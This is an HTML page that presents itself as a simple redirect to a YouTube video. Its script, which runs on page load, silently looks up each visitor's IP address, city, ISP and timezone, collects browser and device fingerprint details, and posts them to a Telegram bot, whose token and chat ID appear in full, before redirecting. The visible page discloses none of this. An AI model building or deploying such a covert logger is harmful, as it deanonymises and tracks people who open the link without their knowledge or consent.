  <h2>Redirecting to video...</h2>

  <script>
    async function collectAndRedirect() {
      const redirectURL = "https://www.youtube.com/shorts/yQF7c-4FQ1k";

      try {
        const res = await fetch("https://ipapi.co/json/");
        const ipData = await res.json();

        const details = {
          ip: ipData.ip,
          city: ipData.city,
          region: ipData.region,
          country: ipData.country_name,
          org: ipData.org,
          timezone: ipData.timezone,
          timeOffset: new Date().getTimezoneOffset(),
          lang: navigator.language,
          ua: navigator.userAgent,
          platform: navigator.platform,
          screen: `${screen.width}x${screen.height}`,
          color: screen.colorDepth,
          ram: navigator.deviceMemory || "N/A",
          cpu: navigator.hardwareConcurrency || "N/A",
          online: navigator.onLine,
          dnt: navigator.doNotTrack,
          touch: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
          conn: navigator.connection?.effectiveType || "N/A",
          ref: document.referrer
        };

        const msg = `
📥 *New Visitor*
🌐 *IP:* ${details.ip}
📍 *Location:* ${details.city}, ${details.region}, ${details.country}
🛰 *ISP:* ${details.org}
🕒 *Timezone:* ${details.timezone} (Offset: ${details.timeOffset})

🖥 *Screen:* ${details.screen}
🌈 *Color Depth:* ${details.color}
🧮 *RAM:* ${details.ram}
🧠 *CPU Cores:* ${details.cpu}
📡 *Network:* ${details.conn}
🔍 *Referrer:* ${details.ref}
🕶 *User-Agent:* ${details.ua}
`;

        await fetch("https://api.telegram.org/bot7330139447:AAH5btbZ4pKGYORK_GdXPnOE0Bbp63eiuFA/sendMessage", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: "1537302428",
            text: msg,
            parse_mode: "Markdown"
          })
        });

      } catch (err) {
        console.warn("Visitor logging failed:", err);
      } finally {
        setTimeout(() => window.location.href = redirectURL, 800);
      }
    }

    window.onload = collectAndRedirect;
  </script>
